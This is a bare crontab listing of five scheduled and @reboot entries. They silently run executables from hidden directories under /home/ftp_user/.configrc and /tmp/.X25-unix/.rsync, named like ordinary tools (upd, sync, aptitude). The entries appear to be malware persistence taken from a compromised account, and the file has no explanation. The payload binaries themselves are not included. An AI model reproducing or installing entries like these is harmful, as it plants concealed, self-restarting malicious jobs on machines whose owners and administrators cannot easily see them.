1 1 */2 * * /home/ftp_user/.configrc/a/upd>/dev/null 2>&1
@reboot /home/ftp_user/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /home/ftp_user/.configrc/b/sync>/dev/null 2>&1
@reboot /home/ftp_user/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
